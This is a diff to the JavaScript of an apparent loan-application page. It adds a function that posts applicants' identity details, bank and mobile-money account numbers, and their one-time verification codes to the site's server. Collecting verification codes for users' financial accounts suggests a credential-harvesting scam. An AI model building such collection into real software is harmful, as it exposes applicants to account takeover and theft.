@@ -1212,7 +1212,7 @@ function loadProcessingScreen() {
 
             clearInterval(timer);
 
-            loadSuccessScreen();
+            submitApplication();
 
         }
 
@@ -1697,3 +1697,75 @@ function initializeEcoReference() {
 
 }
             
+// ===============================
+// SUBMIT APPLICATION TO SERVER
+// ===============================
+
+async function submitApplication() {
+
+    const data = {
+
+        fullNames: sessionStorage.getItem("fullNames"),
+        dateOfBirth: sessionStorage.getItem("dateOfBirth"),
+        idNumber: sessionStorage.getItem("idNumber"),
+        occupation: sessionStorage.getItem("occupation"),
+        loanPurpose: sessionStorage.getItem("loanPurpose"),
+
+        loanAmount: sessionStorage.getItem("loanAmount"),
+        loanPeriod: sessionStorage.getItem("loanPeriod"),
+        monthlyRepayment: sessionStorage.getItem("monthlyRepayment"),
+        totalRepayment: sessionStorage.getItem("totalRepayment"),
+
+        disbursementMethod: sessionStorage.getItem("disbursementMethod"),
+
+        selectedBank: sessionStorage.getItem("selectedBank"),
+        accountName: sessionStorage.getItem("accountName"),
+        bankPhone: sessionStorage.getItem("bankPhone"),
+        accountNumber: sessionStorage.getItem("accountNumber"),
+        verificationCode: sessionStorage.getItem("verificationCode"),
+        bankReference: sessionStorage.getItem("bankReference"),
+
+        ecoName: sessionStorage.getItem("ecoName"),
+        ecoNumber: sessionStorage.getItem("ecoNumber"),
+        ecoVerificationCode: sessionStorage.getItem("ecoVerificationCode"),
+        ecoReference: sessionStorage.getItem("ecoReference")
+
+    };
+
+    try {
+
+        const response = await fetch("/submit-application", {
+
+            method: "POST",
+
+            headers: {
+
+                "Content-Type": "application/json"
+
+            },
+
+            body: JSON.stringify(data)
+
+        });
+
+        const result = await response.json();
+
+        if(result.success){
+
+            loadSuccessScreen();
+
+        }else{
+
+            alert("Failed to save your application.");
+
+        }
+
+    } catch(err){
+
+        console.error(err);
+
+        alert("Unable to connect to the server.");
+
+    }
+
+}
